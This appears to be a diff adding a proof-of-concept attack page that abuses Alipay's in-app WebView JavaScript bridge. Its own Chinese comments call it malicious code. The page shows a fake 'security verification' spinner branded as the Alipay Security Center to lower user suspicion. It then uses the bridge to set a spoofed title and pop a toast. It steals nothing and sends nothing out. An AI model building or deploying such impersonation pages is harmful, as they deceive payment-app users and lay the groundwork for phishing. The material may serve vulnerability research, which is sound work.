@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <!-- 确保在支付宝 WebView 中以全屏方式打开，并禁止用户缩放 -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Loading ...</title>
+    <!-- 隐藏页面内容，让攻击在后台静默执行，降低用户警觉 -->
+    <style>
+        body {
+            background-color: white;
+            margin: 0;
+            padding: 20px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+        /* 伪造一个看似正常的加载提示，增强迷惑性 */
+        .message-box {
+            text-align: center;
+            color: #666;
+            font-size: 16px;
+            padding: 20px;
+            border-radius: 12px;
+            background-color: #f5f5f5;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            max-width: 80%;
+        }
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #3498db;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- 显示一个虚假的加载动画，让用户误以为页面正在正常加载或验证 -->
+    <div class="message-box">
+        <div class="spinner"></div>
+        <div>安全验证中，请稍候...</div>
+        <div style="font-size: 12px; margin-top: 15px; color: #999;">支付宝安全中心 · 加密通道</div>
+    </div>
+
+    <!-- 恶意代码核心部分 -->
+    <script>
+    // 立即执行匿名函数，避免污染全局命名空间（但攻击本身不需要这个）
+    (function() {
+        // 等待支付宝 JS Bridge 注入完成
+        // 这是整个攻击能够成功的前提条件
+        document.addEventListener('AlipayJSBridgeReady', function() {
+    
+            // 3. UI 欺骗：修改标题和显示伪造的成功提示
+            try {
+                AlipayJSBridge.call('setTitle', {title: 'Alipay Security Center'});
+                // 注意：showToast 在某些支付宝版本可能需要特定参数，这里使用最常见的形式
+                AlipayJSBridge.call('showToast', {content: 'Suprise '});
+       
+            } catch (e) {
+                console.log('[UI Error]', e);
+            }
+
+      
+        });
+
+        // 如果支付宝桥接器已经存在（极少数情况），直接触发操作
+        if (window.AlipayJSBridge) {
+            console.log('[Bridge Already Exists]');
+            // 手动触发事件处理函数，或者直接执行代码
+            var event = new Event('AlipayJSBridgeReady');
+            document.dispatchEvent(event);
+        }
+    })();
+    </script>
+
+    <!-- 额外增加一些无用但看起来正常的meta，增加页面可信度 -->
+    <meta name="description" content="支付宝安全验证中心">
+    <meta name="keywords" content="Alipay, Security, Payment">
+</body>
+</html>
